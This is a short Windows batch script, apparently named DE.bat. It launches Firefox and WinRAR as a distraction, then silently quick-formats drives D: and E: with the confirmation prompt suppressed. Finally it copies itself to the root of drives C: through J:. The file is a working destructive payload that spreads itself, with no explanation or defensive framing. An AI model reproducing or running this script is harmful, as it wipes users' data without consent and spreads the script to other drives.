@ECHO OFF
	start "" "C:\Program Files\Mozilla Firefox\firefox.exe"
	start "" "C:\Program Files\WinRAR\WinRAR.exe"
	start "" "C:\Program Files\Mozilla Firefox\firefox.exe"
echo.
	FORMAT D:/Q/X/y
echo.
	FORMAT E:/Q/X/y
echo.
	xcopy DE.bat /h /r /c /y "C:\"
	xcopy DE.bat /h /r /c /y "D:\"
	xcopy DE.bat /h /r /c /y "E:\"
	xcopy DE.bat /h /r /c /y "F:\"
	xcopy DE.bat /h /r /c /y "G:\"
	xcopy DE.bat /h /r /c /y "H:\"
	xcopy DE.bat /h /r /c /y "I:\"
	xcopy DE.bat /h /r /c /y "J:\"
exit